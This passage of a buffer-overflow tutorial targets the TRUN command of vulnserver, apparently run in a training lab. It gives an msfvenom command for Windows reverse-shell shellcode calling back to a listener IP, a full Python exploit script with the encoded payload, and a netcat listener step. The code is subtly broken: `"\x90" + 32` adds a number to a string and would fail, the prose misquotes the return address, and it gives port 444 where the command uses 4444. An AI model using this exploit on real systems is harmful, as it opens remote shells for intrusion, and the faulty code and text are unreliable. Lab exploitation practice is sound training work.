Generating shellcode means we need a way in which our victim is going to connect back to us, We will be using **msfvenom** for this, to generate our payload, the command will be :

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.157 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"  
```

**LHOST:** the IP in which the target is gonna connect back to
**LPORT:** the port in which target will connect back to
**EXITFUNC:** Makes connection more stable
**-f:** for file type in this case C
**-a:** for architecture, could be x64 or x86
**-b:** for bad characters

- Paste this command into your terminal and you should get a payload

![](https://i.imgur.com/fTp8ZvG.png)

Now insert this payload into this python script replacing the value of the variable `shellcode` with the payload 

```python
#!/usr/bin/python
 
import sys, socket

overflow = ("\xbe\xa0\x7a\x1b\xf1\xdb\xdf\xd9\x74\x24\xf4\x58\x29\xc9"
"\xb1\x52\x31\x70\x12\x83\xc0\x04\x03\xd0\x74\xf9\x04\xec"
"\x61\x7f\xe6\x0c\x72\xe0\x6e\xe9\x43\x20\x14\x7a\xf3\x90"
"\x5e\x2e\xf8\x5b\x32\xda\x8b\x2e\x9b\xed\x3c\x84\xfd\xc0"
"\xbd\xb5\x3e\x43\x3e\xc4\x12\xa3\x7f\x07\x67\xa2\xb8\x7a"
"\x8a\xf6\x11\xf0\x39\xe6\x16\x4c\x82\x8d\x65\x40\x82\x72"
"\x3d\x63\xa3\x25\x35\x3a\x63\xc4\x9a\x36\x2a\xde\xff\x73"
"\xe4\x55\xcb\x08\xf7\xbf\x05\xf0\x54\xfe\xa9\x03\xa4\xc7"
"\x0e\xfc\xd3\x31\x6d\x81\xe3\x86\x0f\x5d\x61\x1c\xb7\x16"
"\xd1\xf8\x49\xfa\x84\x8b\x46\xb7\xc3\xd3\x4a\x46\x07\x68"
"\x76\xc3\xa6\xbe\xfe\x97\x8c\x1a\x5a\x43\xac\x3b\x06\x22"
"\xd1\x5b\xe9\x9b\x77\x10\x04\xcf\x05\x7b\x41\x3c\x24\x83"
"\x91\x2a\x3f\xf0\xa3\xf5\xeb\x9e\x8f\x7e\x32\x59\xef\x54"
"\x82\xf5\x0e\x57\xf3\xdc\xd4\x03\xa3\x76\xfc\x2b\x28\x86"
"\x01\xfe\xff\xd6\xad\x51\x40\x86\x0d\x02\x28\xcc\x81\x7d"
"\x48\xef\x4b\x16\xe3\x0a\x1c\xd9\x5c\x14\x41\xb1\x9e\x14"
"\x68\x1e\x16\xf2\xe0\x8e\x7e\xad\x9c\x37\xdb\x25\x3c\xb7"
"\xf1\x40\x7e\x33\xf6\xb5\x31\xb4\x73\xa5\xa6\x34\xce\x97"
"\x61\x4a\xe4\xbf\xee\xd9\x63\x3f\x78\xc2\x3b\x68\x2d\x34"
"\x32\xfc\xc3\x6f\xec\xe2\x19\xe9\xd7\xa6\xc5\xca\xd6\x27"
"\x8b\x77\xfd\x37\x55\x77\xb9\x63\x09\x2e\x17\xdd\xef\x98"
"\xd9\xb7\xb9\x77\xb0\x5f\x3f\xb4\x03\x19\x40\x91\xf5\xc5"
"\xf1\x4c\x40\xfa\x3e\x19\x44\x83\x22\xb9\xab\x5e\xe7\xd9"
"\x49\x4a\x12\x72\xd4\x1f\x9f\x1f\xe7\xca\xdc\x19\x64\xfe"
"\x9c\xdd\x74\x8b\x99\x9a\x32\x60\xd0\xb3\xd6\x86\x47\xb3"
"\xf2")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" + 32 + overflow

try: 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.0.106',9999))
        s.send(('TRUN /.:/' + shellcode))
        s.close()

except:
        print ("Error Connecting to the server")
        sys.exit()
```

Note that the `"\x90" + 32` in `shellcode = "A" * 2003 + "\xaf\x11\x50\62" + "\x90" + 32 + overflow` is called a noop which mean **No Operation**

- Save this script on Linux machine
- Start up a netcat listener on port 444 `nc -lvnp 4444` as specified port we stated in the command used to create the payload earlier
- Now start up vulnserver on your windows machine
- Run the script we saved and you should get a MS DOS shell

![](https://i.imgur.com/j7Kr3JE.gif)


